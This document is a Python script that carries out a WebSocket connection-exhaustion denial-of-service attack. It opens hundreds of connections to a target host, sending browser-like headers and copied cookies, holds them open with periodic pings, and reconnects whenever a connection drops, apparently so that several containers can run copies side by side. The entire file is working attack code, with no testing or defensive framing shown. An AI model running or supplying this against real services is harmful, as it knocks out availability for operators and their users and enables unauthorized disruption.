#!/usr/bin/env python3
"""
ws_exhaust.py — WebSocket connection exhaustion.
Establishes WebSocket connections using full browser headers and holds them
open indefinitely by responding to pings.
"""

import asyncio
import time
import sys
import os
import base64
import struct

from request_loader import load_request_data, build_cookie_header

REQ = load_request_data()
TARGET_HOST = REQ["host"]
TARGET_PORT = REQ["port"]

CONNECT_TIMEOUT = 15
KEEPALIVE_INTERVAL = 20
RECONNECT_DELAY = 3

NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 500
CONTAINER_NAME = os.environ.get("CONTAINER_NAME", "instance-1")

active_slots = 0
total_connects = 0
total_errors = 0
lock = asyncio.Lock()


def ws_key():
    return base64.b64encode(os.urandom(16)).decode()


def ws_frame(payload: bytes, opcode: int = 0x1) -> bytes:
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    length = len(payload)
    if length < 126:
        header = struct.pack("BB", 0x80 | opcode, 0x80 | length)
    elif length < 65536:
        header = struct.pack("!BBH", 0x80 | opcode, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x80 | opcode, 0x80 | 127, length)
    return header + mask + masked


def ws_ping_frame() -> bytes:
    return ws_frame(b"ping", opcode=0x9)


async def ws_worker(cid: int):
    global active_slots, total_connects, total_errors

    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET_HOST, TARGET_PORT),
                timeout=CONNECT_TIMEOUT,
            )

            key = ws_key()
            ua = REQ["headers"].get("User-Agent", REQ["headers"].get("user-agent", "Mozilla/5.0"))

            handshake = f"GET {REQ['path']} HTTP/1.1\r\n"
            handshake += f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
            handshake += f"User-Agent: {ua}\r\n"
            handshake += "Upgrade: websocket\r\n"
            handshake += "Connection: Upgrade\r\n"
            handshake += f"Sec-WebSocket-Key: {key}\r\n"
            handshake += "Sec-WebSocket-Version: 13\r\n"
            handshake += f"Origin: {REQ.get('scheme', 'https')}://{TARGET_HOST}\r\n"

            cookie_str = build_cookie_header(REQ["cookies"])
            if cookie_str:
                handshake += f"Cookie: {cookie_str}\r\n"

            for k, v in REQ["headers"].items():
                kl = k.lower()
                if kl in ("host", "user-agent", "upgrade", "connection",
                          "sec-websocket-key", "sec-websocket-version", "origin", "cookie"):
                    continue
                handshake += f"{k}: {v}\r\n"

            handshake += "\r\n"

            writer.write(handshake.encode())
            await writer.drain()

            response = b""
            while b"\r\n\r\n" not in response:
                chunk = await asyncio.wait_for(reader.read(256), timeout=15)
                if not chunk:
                    raise ConnectionError("Server closed during WS handshake")
                response += chunk

            if b"101" not in response:
                raise ConnectionError(f"WS upgrade failed: {response[:80]}")

            async with lock:
                active_slots += 1
                total_connects += 1

            while True:
                await asyncio.sleep(KEEPALIVE_INTERVAL)
                writer.write(ws_ping_frame())
                await writer.drain()
                try:
                    await asyncio.wait_for(reader.read(256), timeout=1)
                except asyncio.TimeoutError:
                    pass

        except Exception:
            async with lock:
                total_errors += 1
                if active_slots > 0:
                    active_slots -= 1
            await asyncio.sleep(RECONNECT_DELAY)

        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


async def status_reporter():
    start = time.time()
    while True:
        await asyncio.sleep(30)
        elapsed = int(time.time() - start)
        print(
            f"[{CONTAINER_NAME}] T+{elapsed}s | "
            f"slots={active_slots}/{NUM_CONNECTIONS} | "
            f"connects={total_connects} | errors={total_errors}",
            flush=True,
        )


async def main():
    print(f"[{CONTAINER_NAME}] WebSocket Exhaustion — {NUM_CONNECTIONS} coroutines", flush=True)
    print(f"[{CONTAINER_NAME}] Target: {TARGET_HOST}:{TARGET_PORT}{REQ['path']}", flush=True)
    print(f"[{CONTAINER_NAME}] Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)

    tasks = []
    for i in range(NUM_CONNECTIONS):
        tasks.append(asyncio.create_task(ws_worker(i)))
        if i % 100 == 99:
            await asyncio.sleep(0.2)

    tasks.append(asyncio.create_task(status_reporter()))
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
